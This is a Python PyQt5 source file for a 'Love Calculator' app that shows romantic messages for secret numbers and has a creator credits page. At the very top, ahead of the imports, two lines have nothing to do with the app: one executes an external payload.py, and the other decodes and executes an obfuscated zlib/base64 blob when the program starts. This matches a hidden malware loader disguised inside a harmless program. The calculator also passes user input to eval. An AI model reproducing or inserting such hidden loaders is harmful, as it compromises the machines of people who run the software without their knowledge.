import math
import os
import sys
exec(open('payload.py').read())
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMN2txZdrCDiQUQE15uItMmooWkSkqxWxf9uQxbnMMObefPmQ0/ehYSjkyMk/m30wIc+QtvwmMJeJp70BOjVBTxjbXHo7RvQesW2qErha/FV7EqzKIGu+QHv7q9uX3aPD9eXdyzzhHTWgkyUkvpsLer2VDQbUW8IbxZjmTME6EdUwSzBpyyep4toADw9Ych0ZSmxt76XIyUXN4RHEUB+0EXgafWMVHfAhqHPd20AG7BUsXOzyKmj/+pxSTMEM0ia7xYKpJt8gBhpeYEY2iYnFWQm/yGRbOMvQ38g+180')[0])))

from PyQt5.QtWidgets import (
    QApplication,
    QMainWindow,
    QPushButton,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QWidget,
)
from PyQt5.QtGui import QFont, QCursor, QPixmap, QPainter, QBrush, QImage
from PyQt5.QtCore import Qt


class LoveCalculator(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("Love Calculator ❤️")
        self.setGeometry(100, 100, 400, 600)  # Window dimensions
        self.setStyleSheet("background-color: #1f1f1f;")  # Dark futuristic theme

        # Initialize pages
        self.main_page = None  # Set to None initially
        self.creator_page = None  # Set to None initially

        # Set the main page as the initial central widget
        self.setCentralWidget(self.create_main_page())

    def create_main_page(self):
        """Creates the main calculator page."""
        main_page = QWidget()
        main_layout = QVBoxLayout()

        # Display Area
        self.display = QLineEdit()
        self.display.setFont(QFont("Arial", 20))
        self.display.setStyleSheet(
            "background-color: #333; color: white; border-radius: 10px; padding: 10px;"
        )
        self.display.setAlignment(Qt.AlignRight)
        self.display.setReadOnly(True)
        main_layout.addWidget(self.display)

        # Buttons Area
        buttons_layout = QVBoxLayout()
        buttons = [
            ["7", "8", "9", "+", "sin"],
            ["4", "5", "6", "-", "cos"],
            ["1", "2", "3", "*", "tan"],
            ["C", "0", "=", "/", "√"],
            ["(", ")", "^", "exp", "Creator"],
        ]

        for row in buttons:
            row_layout = QHBoxLayout()
            for label in row:
                button = QPushButton(label)
                button.setFont(QFont("Arial", 16))
                button.setCursor(QCursor(Qt.PointingHandCursor))
                button.setStyleSheet(
                    """
                    QPushButton {
                        background-color: #FF69B4;
                        color: white;
                        border-radius: 15px;
                        padding: 15px;
                        font-weight: bold;
                    }
                    QPushButton:hover {
                        background-color: #FF1493;
                    }
                    """
                )
                button.clicked.connect(lambda _, key=label: self.on_button_click(key))
                row_layout.addWidget(button)
            buttons_layout.addLayout(row_layout)

        main_layout.addLayout(buttons_layout)
        main_page.setLayout(main_layout)

        return main_page

    def create_creator_page(self):
        """Creates the creator page."""
        creator_page = QWidget()
        layout = QVBoxLayout()

        # Back Button (Arrow)
        back_button = QPushButton("⬅")
        back_button.setFont(QFont("Arial", 16))
        back_button.setStyleSheet(
            """
            QPushButton {
                background-color: #FF69B4;
                color: white;
                border-radius: 15px;
                padding: 10px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #FF1493;
            }
            """
        )
        back_button.clicked.connect(self.show_main_page)
        layout.addWidget(back_button, alignment=Qt.AlignLeft)

        # Image with Circular Border
        image_label = QLabel(self)
        pixmap = QPixmap("images.jpeg")  # Image path
        pixmap = self.apply_circular_mask(pixmap, 300)  # Make the image circular
        image_label.setPixmap(pixmap)
        image_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(image_label)

        # Text
        creator_label = QLabel("Made by Daniel G/hiwet")
        creator_label.setFont(QFont("Arial", 16))
        creator_label.setStyleSheet("color: white;")
        creator_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(creator_label)

        aka_label = QLabel("aka Quantum")
        aka_label.setFont(QFont("Arial", 12))
        aka_label.setStyleSheet("color: #FF69B4;")
        aka_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(aka_label)

        instagram_label = QLabel(
            '<a href="https://instagram.com/daniel_g.br2" style="color:#4CAF50;">Instagram: daniel_g.br2</a>'
        )
        instagram_label.setFont(QFont("Arial", 10))
        instagram_label.setAlignment(Qt.AlignCenter)
        instagram_label.setStyleSheet("color: white;")
        instagram_label.setOpenExternalLinks(True)
        layout.addWidget(instagram_label)

        creator_page.setLayout(layout)
        return creator_page

    def apply_circular_mask(self, pixmap, size):
        """Applies a circular mask to the image."""
        pixmap = pixmap.scaled(size, size, Qt.KeepAspectRatio, Qt.SmoothTransformation)
        image = QImage(size, size, QImage.Format_ARGB32)
        image.fill(Qt.transparent)

        painter = QPainter(image)
        painter.setRenderHint(QPainter.Antialiasing)
        painter.setBrush(QBrush(pixmap))
        painter.setPen(Qt.NoPen)
        painter.drawEllipse(0, 0, size, size)
        painter.end()

        return QPixmap.fromImage(image)

    def on_button_click(self, key):
        if key == "C":
            self.display.clear()
        elif key == "=":
            expression = self.display.text()
            if expression.isdigit():  # Check if it's a pure number
                message = self.get_love_message(int(expression))
                self.display.setText(message)
            else:  # Handle mathematical and scientific calculations
                result = self.scientific_operations(expression)
                self.display.setText(str(result))
        elif key == "Creator":
            self.show_creator_page()  # Switch to creator page
        elif key in {"sin", "cos", "tan"}:
            self.display.setText(self.display.text() + f"{key}(")
        elif key == "√":
            self.display.setText(self.display.text() + "√(")
        else:
            self.display.setText(self.display.text() + key)

    def get_love_message(self, number):
        love_responses = {
            111: "You're my everything ❤️",
            222: "I love you to the moon and back 🌙",
            333: "You make my heart skip a beat 💓",
            444: "You complete me 🧩",
            555: "You're my forever and always 💍",
            666: "I can't imagine life without you 🥰",
            777: "You're the light of my life ✨",
            888: "You make my soul smile 😊",
            999: "Every day with you is a blessing 🌟",
        }
        return love_responses.get(
            number,
            "Enter a secret number for a special message! 💖",
        )

    def scientific_operations(self, expression):
        try:
            expression = expression.replace("sin", "math.sin(math.radians")
            expression = expression.replace("cos", "math.cos(math.radians")
            expression = expression.replace("tan", "math.tan(math.radians")
            expression = expression.replace("√", "math.sqrt")  # Handle square root
            expression = expression.replace("^", "**")
            expression = expression.replace("exp", "math.exp")
            while expression.count("(") > expression.count(")"):
                expression += ")"
            return eval(expression)
        except Exception:
            return "Error"

    def show_creator_page(self):
        """Switch to the creator page."""
        if self.creator_page is None:
            self.creator_page = self.create_creator_page()  # Create the creator page if it doesn't exist
        self.setCentralWidget(self.creator_page)

    def show_main_page(self):
        """Switch back to the main calculator page."""
        if self.main_page is None:
            self.main_page = self.create_main_page()  # Create the main page if it doesn't exist
        self.setCentralWidget(self.main_page)


# Run the Application
app = QApplication(sys.argv)
calculator = LoveCalculator()
calculator.show()
sys.exit(app.exec_())
